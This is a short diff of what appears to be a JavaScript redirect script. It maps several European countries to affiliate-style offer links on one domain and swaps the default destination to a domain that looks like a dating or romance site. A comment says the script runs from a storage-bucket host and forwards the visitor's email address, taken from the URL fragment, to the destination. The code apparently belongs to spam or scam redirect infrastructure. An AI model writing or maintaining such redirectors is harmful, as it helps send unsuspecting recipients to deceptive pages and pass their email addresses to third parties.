@@ -5,7 +5,9 @@ const se_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2
 const no_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=123729&s1=G20&s2=G20';
 const ch_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=120583&s1=G20&s2=G20';
 const de_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=146265&s1=G20&s2=G20';
-const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
+//const DEFAULT_REDIRECT_URL = 'https://glhpmr9.ladysearchs.com/xv7hcug';
+const DEFAULT_REDIRECT_URL = 'https://d2027.valentineromance.mom/?s1=lgx1';
+
 
 // Base URL used when the bucket host contains the tag "abc".
 // The `email=` query parameter is replaced with the value after "#" in the current URL.
